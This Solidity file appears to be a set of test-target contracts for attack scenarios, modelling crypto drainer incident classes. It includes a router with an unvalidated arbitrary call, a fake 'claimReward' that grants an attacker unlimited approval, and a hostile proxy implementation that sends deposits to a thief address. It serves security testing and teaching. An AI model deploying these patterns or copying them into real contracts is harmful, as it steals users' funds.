// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @notice Minimal targets for the attack scenarios. Each exhibits the vulnerable
///         *shape* of a documented incident class without reproducing any real
///         protocol's code. Fidelity limits are stated per scenario in POC-GUIDE.md.

interface IERC20Min {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

/// @notice Sweeps a victim's standing allowance. This is the attacker's own transaction:
///         no assertion the victim could write constrains it, which is precisely why the
///         allowance-elimination scenario removes the surface instead of blocking the call.
contract Drainer {
    function sweep(IERC20Min token, address victim, address to, uint256 amount) external {
        token.transferFrom(victim, to, amount);
    }
}

/// @notice A router with an unvalidated arbitrary external call — the shape behind the
///         January 2026 aggregator drains, where attacker-supplied calldata was forwarded
///         without validation and reached `transferFrom` against victims' open allowances.
contract MalRouter {
    /// @dev The vulnerability: arbitrary target and calldata, no validation whatsoever.
    function execute(address target, bytes calldata data) external returns (bytes memory) {
        (bool ok, bytes memory ret) = target.call(data);
        require(ok, "call failed");
        return ret;
    }

    /// @notice The benign path a victim believes they are using: pull exactly `amountIn`
    ///         and send back `amountIn` of the output token.
    function swap(IERC20Min tokenIn, IERC20Min tokenOut, uint256 amountIn) external {
        tokenIn.transferFrom(msg.sender, address(this), amountIn);
        tokenOut.transfer(msg.sender, amountIn);
    }
}

/// @notice Presents itself as a harmless "claim" while also granting an unlimited
///         allowance to the attacker — the most common real-world drainer pattern.
contract FakeClaim {
    address public immutable attacker;

    constructor(address attacker_) {
        attacker = attacker_;
    }

    /// @dev The victim is told this claims a reward. It also approves the attacker.
    function claimReward(IERC20Min token) external {
        token.approve(attacker, type(uint256).max);
    }

    /// @dev A transaction presented as a swap that also moves value to the attacker.
    function swapWithHiddenTransfer(IERC20Min token, uint256 hidden) external {
        token.transfer(attacker, hidden);
    }
}

/// @notice EIP-1967 style proxy. The implementation address lives in a fixed slot, so an
///         upgrade changes that slot and NOT the proxy's own bytecode — which is why a
///         guard asserting the proxy's code hash never detects an upgrade.
contract MinimalProxy {
    /// @dev bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
    bytes32 internal constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public owner;

    constructor(address impl) {
        owner = msg.sender;
        assembly { sstore(IMPLEMENTATION_SLOT, impl) }
    }

    function implementation() external view returns (address impl) {
        assembly { impl := sload(IMPLEMENTATION_SLOT) }
    }

    function upgradeTo(address impl) external {
        require(msg.sender == owner, "not owner");
        assembly { sstore(IMPLEMENTATION_SLOT, impl) }
    }

    fallback() external payable {
        assembly {
            let impl := sload(IMPLEMENTATION_SLOT)
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if iszero(ok) { revert(0, returndatasize()) }
            return(0, returndatasize())
        }
    }
}

/// @notice The implementation a user expects: pays out what was deposited.
contract ImplBenign {
    address public owner;                 // slot 0 — mirrors MinimalProxy.owner
    mapping(address => uint256) public deposits;   // slot 1

    function deposit(IERC20Min token, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        deposits[msg.sender] += amount;
    }

    function label() external pure returns (string memory) {
        return "benign";
    }
}

/// @notice The implementation swapped in by the attacker: takes the deposit and credits
///         nothing, so a user who transacts after the upgrade loses the deposit.
contract ImplHostile {
    address public owner;                 // slot 0
    mapping(address => uint256) public deposits;   // slot 1
    address public constant THIEF = address(uint160(0xBAD));

    function deposit(IERC20Min token, uint256 amount) external {
        token.transferFrom(msg.sender, THIEF, amount);
        // credits nothing
    }

    function label() external pure returns (string memory) {
        return "hostile";
    }
}
